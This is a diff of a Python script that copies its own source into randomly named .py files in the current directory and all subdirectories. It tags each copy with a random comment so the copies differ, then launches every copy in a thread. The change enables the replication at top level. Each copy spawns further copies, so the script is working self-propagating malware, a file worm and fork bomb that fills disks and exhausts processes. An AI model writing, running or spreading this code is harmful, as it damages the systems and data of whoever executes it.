@@ -30,42 +30,38 @@ def runFuncv(filename):
     os.system('python3 ' + filename)
 
 # get the current file
-
-def create_file(dir):
-    abspath = os.path.abspath(__file__)
-    thisfile = os.path.basename(__file__)
-    directory = os.getcwd()
-
-    f = open(thisfile, "r")
-    lines = f.readlines()
-    f.close()
-
-    filename = "{randomness}.py".format(
-        randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=5)))
-
-    
-    i = open(dir + "\\" + filename, "w")
-    writeIntoFile(i, lines)
-    i.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
-    i.close()
-    return filename
-
-
-# Create the new file in current dir and run
-#thread = Thread(target=runFuncv, args=[".\\" + create_file(".\\")])
-#thread.start()
-
-
-
+thisfile = os.path.basename(__file__)
 directory = os.getcwd()
+
+# open up the file and read it
+f = open(thisfile, "r")
+lines = f.readlines()
+f.close()
+
+
+
+
+# Create the new file and include a different name
+filename = "{randomness}.py".format(
+    randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=5)))
+i = open(".\\" + filename, "w")
+writeIntoFile(i, lines)
+i.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
+i.close()
+thread = Thread(target=runFuncv, args=[".\\" + filename])
+thread.start()
+
 #walk to subdirs
 for x in os.walk(directory):
     if x[0] == os.getcwd():
         continue
     # Create the new file and include a different name
-    filename = create_file(x[0])
-    
-    thread = Thread(target=runFuncv, args=[x[0] + "\\" + filename])
+    filename = "{randomness}.py".format(randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=5)))
+    g = open(x[0] + "\\" + filename, "w")
+    writeIntoFile(g, lines)
+    g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
+    g.close()
+    thread = Thread(target=runFuncv, args=[x[0] + "\\" +filename])
     thread.start()
 
 
